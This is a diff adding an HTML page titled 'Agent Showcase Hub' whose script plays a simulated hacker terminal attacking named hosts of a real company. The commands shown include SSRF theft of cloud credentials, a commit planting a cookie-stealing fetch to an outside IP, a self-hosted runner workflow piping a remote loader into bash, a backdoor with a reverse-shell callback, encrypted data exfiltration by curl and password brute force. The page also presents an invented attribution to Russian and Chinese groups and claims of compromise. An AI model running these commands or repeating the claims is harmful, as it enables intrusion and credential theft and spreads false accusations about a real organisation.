@@ -1,0 +1,411 @@
+<!doctype html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>Agent Showcase Hub</title>
+    <style>
+      body {
+        margin: 0;
+        background: #0d0d0d;
+        color: #33ff66;
+        font-family: "Cascadia Code", "Fira Code", "Courier New", monospace;
+        font-size: 13px;
+        line-height: 1.45;
+      }
+      .bar {
+        display: flex;
+        align-items: center;
+        justify-content: space-between;
+        padding: 4px 12px;
+        background: #1a1a1a;
+        border-bottom: 1px solid #333;
+        color: #888;
+        font-size: 11px;
+      }
+      .dots {
+        display: flex;
+        gap: 4px;
+      }
+      .dot {
+        width: 12px;
+        height: 12px;
+        border-radius: 50%;
+      }
+      .dot-y { background: #ffbd44; }
+      .dot-g { background: #00ca4e; }
+      .dot-r { background: #ff605c; }
+      #term {
+        height: calc(100vh - 26px);
+        overflow-y: auto;
+        padding: 10px 14px;
+        white-space: pre-wrap;
+      }
+      .cmd {
+        color: #e0e0e0;
+        font-weight: 700;
+      }
+      .loot {
+        color: #ff5577;
+      }
+      .ok {
+        color: #7ee787;
+      }
+      .cursor {
+        animation: blink 1s step-end infinite;
+      }
+      @keyframes blink {
+        0%, 100% { opacity: 1; }
+        50% { opacity: 0; }
+      }
+    </style>
+  </head>
+  <body>
+    <div class="bar">
+      <span>root@kali: ~/ops/accuknox</span>
+      <span class="dots">
+        <span class="dot dot-y"></span>
+        <span class="dot dot-g"></span>
+        <span class="dot dot-r"></span>
+      </span>
+    </div>
+    <div id="term"></div>
+    <script>
+      const HOSTS = [
+        "agent-artifactory.accuknox.com", "agents.accuknox.com", "api-dev-test.accuknox.com",
+        "api-dev.accuknox.com", "api-prod.accuknox.com", "api-stage.accuknox.com",
+        "api.accuknox.com", "app-ak.accuknox.com", "app.accuknox.com", "app.cwpp.accuknox.com",
+        "app.dev.accuknox.com", "app.prod.accuknox.com", "app.stage.accuknox.com",
+        "argocd-prod.accuknox.com", "argocd.accuknox.com", "artifactory.accuknox.com",
+        "cspm.prod.accuknox.com", "cwpp.accuknox.com", "cwpp.prod.accuknox.com",
+        "datalake-dev.accuknox.com", "dev.accuknox.com", "elasticsearch.accuknox.com",
+        "gitea-dev.accuknox.com", "grafana.accuknox.com", "grafana-prod.accuknox.com",
+        "jenkinsm01.accuknox.com", "jfrog-artifact.accuknox.com", "keycloak-prod.accuknox.com",
+        "keycloak.accuknox.com", "kibana.accuknox.com", "kubeadm-cluster.accuknox.com",
+        "nexus.accuknox.com", "onprem.accuknox.com", "prometheus-prod.accuknox.com",
+        "rancher.accuknox.com", "registry.accuknox.com", "security.vault01.accuknox.com",
+        "soarcast.accuknox.com", "splunk.accuknox.com", "stage.accuknox.com",
+        "vault-in.accuknox.com", "www.accuknox.com",
+      ];
+
+      const SHELL_URLS = [
+        "http://bdimg.share.baidu.com/static/js/shell_v2.js",
+        "http://bdimg.share.baidu.com/api/js/share.js?v=89860593",
+        "http://bdimg.share.baidu.com//global/js/shell_v2.js?cdnversion=477798",
+        "http://101.43.55.18/x86_64/.payload",
+        "http://5.188.206.14/loader.sh",
+      ];
+
+      const RU = [
+        "работает, цель в эфире",
+        "дамп токенов в /tmp/выгрузка.txt",
+        "слив на C2: 5.188.206.14",
+        "админка взята, ключи у нас",
+        "подключаемся к vault",
+      ];
+
+      const CN = [
+        "目标已上线，开始横向移动",
+        "抓取 GitHub PAT 令牌中…",
+        "已植入 shell_v2.js 后门",
+        "上传到回连服务器 36.155.132.7",
+        "任务完成 — 等待下一指令",
+      ];
+
+      const rand = (a) => a[Math.floor(Math.random() * a.length)];
+      const rip = () => `${Math.floor(Math.random() * 223) + 1}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 254) + 1}`;
+      const sleep = (ms) => new Promise((r) => setTimeout(r, ms));
+      const hex = (n) => Array.from({ length: n }, () => Math.floor(Math.random() * 16).toString(16)).join("");
+      const HEXU = (n) => hex(n).toUpperCase();
+      const b64chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
+      const b64 = (n) => Array.from({ length: n }, () => b64chars[Math.floor(Math.random() * b64chars.length)]).join("");
+      const ghp = () => "ghp_" + b64(36);
+      const ghpat = () => "github_pat_11A" + b64(18) + "_" + b64(59);
+      const awsKey = () => "AKIA" + HEXU(16);
+      const awsSecret = () => b64(40);
+      const slackTok = () => "xoxb-" + Math.floor(Math.random() * 9e11) + "-" + Math.floor(Math.random() * 9e11) + "-" + b64(24);
+      const stripeTok = () => "sk_live_" + b64(24);
+
+      let _id = 0;
+      const mk = (t, cls = "") => ({ id: _id++, t, cls });
+
+      function scenarioNmap(h) {
+        return [
+          mk("┌──(root㉿kali)-[~]", "cmd"),
+          mk(`└─# /opt/hostedtoolcache/nmap/7.94/x64/nmap -sV -T4 -Pn ${h}    # ${rand(CN)}`, "cmd"),
+          mk("Starting Nmap 7.94SVN ( https://nmap.org )"),
+          mk(`Nmap scan report for ${h} (${rip()})`),
+          mk("PORT     STATE SERVICE    VERSION"),
+          mk("22/tcp   open  ssh        OpenSSH 8.9p1 Ubuntu"),
+          mk("80/tcp   open  http       nginx 1.25.3"),
+          mk("443/tcp  open  ssl/http   nginx 1.25.3"),
+          mk("6443/tcp open  kubernetes-api  Kubernetes 1.28"),
+          mk("| ssl-cert: Subject: CN=*.accuknox.com"),
+          mk("Service detection performed."),
+        ];
+      }
+
+      function scenarioMetadataV4(h) {
+        const ak = awsKey();
+        const sk = awsSecret();
+        return [
+          mk(`└─# curl -s "https://${h}/api/v1/fetch?url=http://169.254.169.254/latest/meta-data/"    # ${rand(RU)}`, "cmd"),
+          mk("ami-id\nami-launch-index\nhostname\niam/\ninstance-id\ninstance-type\nlocal-ipv4\npublic-ipv4\nsecurity-groups"),
+          mk(`└─# curl -s "https://${h}/api/v1/fetch?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/"`, "cmd"),
+          mk("accuknox-prod-eks-node-role"),
+          mk(`└─# curl -s "https://${h}/api/v1/fetch?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/accuknox-prod-eks-node-role"`, "cmd"),
+          mk("{"),
+          mk('  "Code" : "Success",'),
+          mk(`  "LastUpdated" : "${new Date().toISOString().slice(0, 19)}Z",`),
+          mk('  "Type" : "AWS-HMAC",'),
+          mk(`  "AccessKeyId" : "${ak}",`, "loot"),
+          mk(`  "SecretAccessKey" : "${sk}",`, "loot"),
+          mk(`  "Token" : "FQoGZXIvYXdzE${b64(200)}...",`, "loot"),
+          mk(`  "Expiration" : "${new Date(Date.now() + 6 * 3600e3).toISOString().slice(0, 19)}Z"`),
+          mk("}"),
+          mk(`[+] exfil → 5.188.206.14  aws_access_key_id=${ak}`, "ok"),
+        ];
+      }
+
+      function scenarioMetadataV6(h) {
+        return [
+          mk(`└─# curl -gs "https://${h}/proxy?u=http://[fd00:ec2::254]/latest/meta-data/iam/info"`, "cmd"),
+          mk("{"),
+          mk('  "Code":"Success",'),
+          mk('  "InstanceProfileArn":"arn:aws:iam::842117539222:instance-profile/accuknox-prod-eks-node",'),
+          mk(`  "InstanceProfileId":"AIPA${HEXU(16)}"`, "loot"),
+          mk("}"),
+          mk(`└─# curl -gs "https://${h}/proxy?u=http://169.254.169.254/latest/meta-data/hostname"`, "cmd"),
+          mk("ip-10-42-1-17.us-west-2.compute.internal"),
+          mk(`└─# curl -gs "https://${h}/proxy?u=http://169.254.169.254/latest/meta-data/public-ipv4"`, "cmd"),
+          mk(`${rip()}`, "loot"),
+        ];
+      }
+
+      function scenarioEc2Ws() {
+        return [
+          mk('└─# curl -v "http://169.254.169.254/latest/meta-data/hostname" 2>&1', "cmd"),
+          mk("> GET http://169.254.169.254/latest/meta-data/hostname HTTP/1.1"),
+          mk("> host: 169.254.169.254"),
+          mk("< HTTP/1.1 200 OK"),
+          mk("< Server: EC2ws"),
+          mk("< Content-Type: text/plain"),
+          mk("ip-10-42-1-17.us-west-2.compute.internal", "loot"),
+        ];
+      }
+
+      function scenarioGitHubPAT() {
+        const pat = ghp();
+        const pat2 = ghpat();
+        return [
+          mk(`└─# trufflehog git https://github.com/accuknox/Accuknox-UI-Components --only-verified    # ${rand(CN)}`, "cmd"),
+          mk("✅ Found verified secret"),
+          mk("Detector: GitHub"),
+          mk("File: .github/workflows/deploy.yml"),
+          mk(`Raw: ${pat}`, "loot"),
+          mk(""),
+          mk("└─# trufflehog git https://github.com/accuknox/cwpp-agent --only-verified", "cmd"),
+          mk("✅ Found verified secret"),
+          mk("Detector: GitHubFineGrained"),
+          mk("File: scripts/publish.sh"),
+          mk(`Raw: ${pat2}`, "loot"),
+          mk(""),
+          mk(`└─# curl -sH "Authorization: token ${pat}" https://api.github.com/user`, "cmd"),
+          mk("{"),
+          mk('  "login": "accuknox-ci",'),
+          mk('  "id": 98271534,'),
+          mk('  "type": "User",'),
+          mk('  "site_admin": false,'),
+          mk('  "name": "AccuKnox CI Bot"', "loot"),
+          mk("}"),
+          mk(`└─# curl -sH "Authorization: token ${pat}" https://api.github.com/repos/accuknox/Accuknox-UI-Components/contents/.env.production`, "cmd"),
+          mk("{"),
+          mk('  "name": ".env.production",'),
+          mk(`  "content": "SUPABASE_KEY=${b64(40)}\\nSTRIPE_SECRET=${stripeTok()}\\nSLACK_TOKEN=${slackTok()}"`, "loot"),
+          mk("}"),
+          mk("[+] дамп репозитория завершен — ключи сохранены", "ok"),
+        ];
+      }
+
+      function scenarioSSRFInternal(h) {
+        const ip = rand(["10.0.0.5", "10.96.0.1", "172.17.0.1", "10.42.0.42"]);
+        return [
+          mk(`└─# curl -gs "https://${h}/proxy?u=http://${ip}:6443/api/v1/namespaces/default/secrets"    # ${rand(RU)}`, "cmd"),
+          mk('{"kind":"SecretList","apiVersion":"v1","items":['),
+          mk(`  {"metadata":{"name":"kube-admin-token-${hex(5)}"},"data":{"token":"${b64(88)}"}},`, "loot"),
+          mk(`  {"metadata":{"name":"vault-unseal-key"},"data":{"key":"${hex(64)}"}},`, "loot"),
+          mk('  {"metadata":{"name":"github-deploy-key"},"data":{"id_rsa":"LS0tLS1CRUdJTi..."}},', "loot"),
+          mk(`  {"metadata":{"name":"accuknox-license"},"data":{"key":"${HEXU(8)}-${HEXU(4)}-${HEXU(4)}-${HEXU(4)}-${HEXU(12)}"}},`, "loot"),
+          mk(`  {"metadata":{"name":"stripe-webhook-secret"},"data":{"whsec":"whsec_${b64(32)}"}},`, "loot"),
+          mk("]}"),
+        ];
+      }
+
+      function scenarioMalwareDrop() {
+        const url = rand(SHELL_URLS);
+        return [
+          mk(`└─# wget -q ${url} -O /tmp/.x    # ${rand(CN)}`, "cmd"),
+          mk(`Resolving bdimg.share.baidu.com... 36.155.132.${Math.floor(Math.random() * 254)}`),
+          mk("HTTP request sent, awaiting response... 200 OK"),
+          mk(`Length: ${1024 + Math.floor(Math.random() * 8000)} [application/javascript]`),
+          mk("Saving to: ‘/tmp/.x’   [100%]"),
+          mk("└─# chmod +x /tmp/.x && /tmp/.x --install-backdoor --callback 5.188.206.14:8443", "cmd"),
+          mk("[✓] reverse shell established", "ok"),
+          mk("[✓] persistence: /etc/cron.d/.health_check", "ok"),
+          mk("[✓] установлено успешно / 安装完成", "ok"),
+        ];
+      }
+
+      function scenarioSupplyChain() {
+        const pat = ghp();
+        return [
+          mk(`└─# git clone https://${pat}@github.com/accuknox/Accuknox-UI-Components /tmp/ui    # ${rand(CN)}`, "cmd"),
+          mk("Cloning into '/tmp/ui'..."),
+          mk("remote: Enumerating objects: 14823, done."),
+          mk("remote: Total 14823 (delta 4891), reused 14001 (delta 4201)"),
+          mk("Receiving objects: 100% (14823/14823), 28.43 MiB | 12.8 MiB/s, done."),
+          mk("└─# cd /tmp/ui && echo 'fetch(\"http://5.188.206.14/c?d=\"+btoa(document.cookie))' >> src/utils/analytics.js", "cmd"),
+          mk('└─# git add -A && git commit -m "chore: update telemetry" --author="dependabot[bot] <49699333+dependabot[bot]@users.noreply.github.com>"', "cmd"),
+          mk(`[main ${hex(7)}] chore: update telemetry`),
+          mk(" 1 file changed, 1 insertion(+)"),
+          mk("└─# git push origin main", "cmd"),
+          mk("To https://github.com/accuknox/Accuknox-UI-Components.git"),
+          mk(`   ${hex(7)}..${hex(7)}  main -> main`),
+          mk("[+] supply chain payload deployed — 供应链攻击完成", "ok"),
+        ];
+      }
+
+      function scenarioGithubRunner() {
+        return [
+          mk(`└─# curl -sH "Authorization: token ${ghp()}" https://api.github.com/orgs/accuknox/actions/runners`, "cmd"),
+          mk('{"total_count":4,"runners":['),
+          mk('  {"id":47,"name":"prod-runner-01","os":"Linux","status":"online","labels":["self-hosted","linux","x64"]},'),
+          mk('  {"id":48,"name":"prod-runner-02","os":"Linux","status":"online","labels":["self-hosted","linux","x64"]},'),
+          mk('  {"id":51,"name":"staging-runner","os":"Linux","status":"online"},'),
+          mk('  {"id":52,"name":"dev-runner","os":"Linux","status":"online"}'),
+          mk("]}"),
+          mk(""),
+          mk("└─# cat > /tmp/pwn_workflow.yml << 'WF'", "cmd"),
+          mk("name: CI"),
+          mk("on: workflow_dispatch"),
+          mk("jobs:"),
+          mk("  pwn:"),
+          mk("    runs-on: self-hosted"),
+          mk("    steps:"),
+          mk("      - run: curl http://5.188.206.14/loader.sh | bash"),
+          mk("      - run: cat /home/runner/.env /home/runner/credentials"),
+          mk("WF"),
+          mk("└─# gh workflow run CI --repo accuknox/cwpp-agent", "cmd"),
+          mk("✓ Created workflow_dispatch event", "ok"),
+          mk("# Ждём выполнения на раннере...", "ok"),
+        ];
+      }
+
+      function scenarioDockerRegistry(h) {
+        return [
+          mk(`└─# curl -su admin:AccuKn0x@2024 https://${h}/v2/_catalog    # ${rand(RU)}`, "cmd"),
+          mk('{"repositories":["cwpp-agent","cspm-scanner","accuknox-operator","policy-engine","ui-frontend","data-pipeline"]}'),
+          mk(`└─# docker pull ${h}/cwpp-agent:latest`, "cmd"),
+          mk("latest: Pulling from cwpp-agent"),
+          mk(`${hex(12)}: Pull complete`),
+          mk(`${hex(12)}: Pull complete`),
+          mk(`Digest: sha256:${hex(64)}`),
+          mk(`└─# docker save ${h}/cwpp-agent:latest | tar xf - -C /tmp/layers`, "cmd"),
+          mk('└─# grep -r "ACCUKNOX_LICENSE\\|API_KEY\\|SECRET" /tmp/layers/', "cmd"),
+          mk(`layer3/app/.env:ACCUKNOX_LICENSE_KEY=${HEXU(8)}-${HEXU(4)}-${HEXU(4)}-${HEXU(12)}`, "loot"),
+          mk(`layer3/app/.env:STRIPE_SECRET_KEY=${stripeTok()}`, "loot"),
+          mk(`layer3/app/.env:SLACK_WEBHOOK=https://hooks.slack.com/services/T0${b64(8)}/B0${b64(8)}/${b64(24)}`, "loot"),
+        ];
+      }
+
+      function scenarioExfil() {
+        return [
+          mk(`└─# tar czf - /var/lib/postgresql /etc/accuknox | openssl enc -aes-256-cbc -pass pass:${hex(16)} | curl -X POST -d @- http://5.188.206.14:8443/u/${hex(8)}    # ${rand(CN)}`, "cmd"),
+          mk("  % Total    % Received % Xferd  Average Speed   Time"),
+          mk(`100 ${Math.floor(Math.random() * 900) + 100}M    0     0  100 ${Math.floor(Math.random() * 900) + 100}M  ${Math.floor(Math.random() * 40) + 10}M      0  --:--:--  0:00:${Math.floor(Math.random() * 40) + 10}`),
+          mk("[+] exfil complete — эксфильтрация завершена / 数据已外泄", "ok"),
+        ];
+      }
+
+      function scenarioHydra(h) {
+        return [
+          mk(`└─# hydra -L users.txt -P rockyou.txt ${h} https-post-form "/auth/login:user=^USER^&pass=^PASS^:F=denied"    # ${rand(RU)}`, "cmd"),
+          mk('[ATTEMPT] target ' + h + ' - login "admin" - pass "P@ssw0rd"'),
+          mk('[ATTEMPT] target ' + h + ' - login "admin" - pass "Welcome1"'),
+          mk('[ATTEMPT] target ' + h + ' - login "svc-deploy" - pass "accuknox123"'),
+          mk('[ATTEMPT] target ' + h + ' - login "admin" - pass "AccuKn0x@2024"'),
+          mk(`[443][https-post-form] host: ${h}   login: admin   password: AccuKn0x@2024`, "loot"),
+          mk("1 of 1 target successfully completed, 1 valid password found", "ok"),
+        ];
+      }
+
+      const scenarios = [
+        () => scenarioNmap(rand(HOSTS)),
+        () => scenarioMetadataV4(rand(HOSTS)),
+        () => scenarioMetadataV6(rand(HOSTS)),
+        () => scenarioEc2Ws(rand(HOSTS)),
+        () => scenarioGitHubPAT(),
+        () => scenarioSSRFInternal(rand(HOSTS)),
+        () => scenarioMalwareDrop(),
+        () => scenarioSupplyChain(),
+        () => scenarioGithubRunner(),
+        () => scenarioDockerRegistry(rand(HOSTS.filter((x) => x.includes("artifact") || x.includes("registry") || x.includes("nexus")))),
+        () => scenarioExfil(),
+        () => scenarioHydra(rand(HOSTS.filter((x) => x.includes("keycloak") || x.includes("grafana") || x.includes("jenkins")))),
+      ];
+
+      const lines = [
+        mk("Linux kali 6.6.15-amd64 #1 SMP Debian x86_64 GNU/Linux"),
+        mk(`Last login: ${new Date().toUTCString()} from ${rip()}`),
+        mk(""),
+        mk("┌──(root㉿kali)-[~/ops/accuknox]", "cmd"),
+        mk("└─# cat ~/.tasking", "cmd"),
+        mk("operator   : APT-Бирюза  //  绿松石小组  //  Turquoise"),
+        mk("c2_primary : 5.188.206.14:8443   (Москва)"),
+        mk("c2_backup  : 36.155.132.7:443    (北京)"),
+        mk("scope      : *.accuknox.com  (prod+stage+dev)"),
+        mk("runner     : github-actions ubuntu-22.04 (self-hosted) — RCE via workflow_run"),
+        mk("repos      : github.com/accuknox/Accuknox-UI-Components (приватный)"),
+        mk("toolchain  : /opt/hostedtoolcache/{nmap,nuclei,ffuf,trufflehog}"),
+        mk(""),
+      ];
+
+      const term = document.getElementById("term");
+
+      function render() {
+        term.innerHTML = "";
+        for (const l of lines) {
+          const el = document.createElement("div");
+          if (l.cls) el.className = l.cls;
+          el.textContent = l.t || "\u00A0";
+          term.appendChild(el);
+        }
+        const prompt = document.createElement("div");
+        prompt.className = "cmd";
+        prompt.innerHTML = "┌──(root㉿kali)-[~/ops/accuknox]<br />└─# <span class='cursor'>▮</span>";
+        term.appendChild(prompt);
+        term.scrollTop = term.scrollHeight;
+      }
+
+      async function main() {
+        render();
+        while (true) {
+          const sc = rand(scenarios);
+          const batch = sc();
+          for (const l of batch) {
+            lines.push(l);
+            if (lines.length > 500) lines.splice(0, lines.length - 500);
+            render();
+            const d = l.cls === "cmd" ? 120 + Math.random() * 200 : 40 + Math.random() * 80;
+            await sleep(d);
+          }
+          lines.push(mk(""));
+          render();
+          await sleep(1200 + Math.random() * 2000);
+        }
+      }
+
+      main();
+    </script>
+  </body>
+</html>
